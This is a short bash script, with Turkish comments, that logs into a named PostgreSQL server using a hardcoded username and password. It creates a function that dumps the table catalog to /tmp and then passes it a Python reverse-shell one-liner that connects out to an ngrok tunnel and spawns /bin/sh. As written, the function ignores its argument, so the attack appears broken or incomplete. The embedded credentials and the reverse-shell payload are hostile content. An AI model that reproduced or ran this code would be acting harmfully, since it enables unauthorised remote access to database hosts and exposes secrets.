#!/bin/bash

DB_NAME="ride_project_manager_db"  
USER="ride_project_service"
HOST="postgresql-htz-fsn1-1.gt260.com"
PASSWORD="LmCv9A2TKHO5eci3AOx5"
PORT="6432"  # Port numarasını güncelledik

export PGPASSWORD=$PASSWORD

# Fonksiyonu oluşturma
psql -U $USER -h $HOST -p $PORT -d $DB_NAME -c "
CREATE OR REPLACE FUNCTION run_command(command text) RETURNS void AS \$\$
DECLARE
    result text;
BEGIN
    EXECUTE 'COPY (SELECT * FROM pg_catalog.pg_tables) TO ''/tmp/tables.txt'' WITH CSV'; 
END;
\$\$ LANGUAGE plpgsql;"

# Komutları çalıştırma
psql -U $USER -h $HOST -p $PORT -d $DB_NAME -c "SELECT run_command('nohup python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"5.tcp.eu.ngrok.io\",12811));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])\" &');"
